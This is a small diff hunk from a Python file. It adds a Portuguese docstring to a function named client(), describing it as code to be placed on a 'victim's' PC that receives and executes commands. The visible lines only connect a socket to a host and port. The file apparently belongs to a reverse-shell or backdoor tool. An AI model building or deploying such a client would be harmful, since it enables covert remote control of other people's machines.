@@ -35,6 +35,9 @@ def serv():
 
 
 def client():
+    """
+    Cliente que será colocado no pc da vítima, ele, por sua vez, recebe e executa comandos
+    """
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((host, port))
     print("Conexão estabelecida")
